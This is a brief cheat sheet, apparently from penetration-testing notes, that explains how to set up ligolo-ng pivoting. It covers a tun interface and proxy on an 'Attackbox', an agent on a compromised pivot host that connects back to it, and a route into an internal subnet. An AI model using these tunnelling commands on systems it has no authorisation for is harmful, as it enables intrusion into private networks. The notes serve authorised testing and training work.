# ligolo-ng

Download proxy and agent

Create tun interface on the Proxy Server (Attackbox):

```bash
sudo ip tuntap add user kali mode tun ligolo
```

Enable the interface:

```bash
sudo ip link set ligolo up
```

Now you should see a new ligolo entry after `ifconfig` or `ip -a`

Run proxy (on Attackbox):

```bash
./proxy -selfcert
```

Run agent (on Pivot Host) (use `-ignore-cert` when `-selfcert` is used):

```bash
./agent -connect IP:PORT -ignore-cert
```

Check the available networks in proxy after the agent joins:

```bash
[Agent : root@dmz01] » ifconfig
```

Select the network (to attack) with CIDR notation

Add route:

```bash
sudo ip route add [CIDR notation (172.16.0.0/16)] dev ligolo
```

Start the tunnel:

```bash
[Agent : root@dmz01] » start
INFO[0018] Starting tunnel to root@dmz01 (005056942701)
```
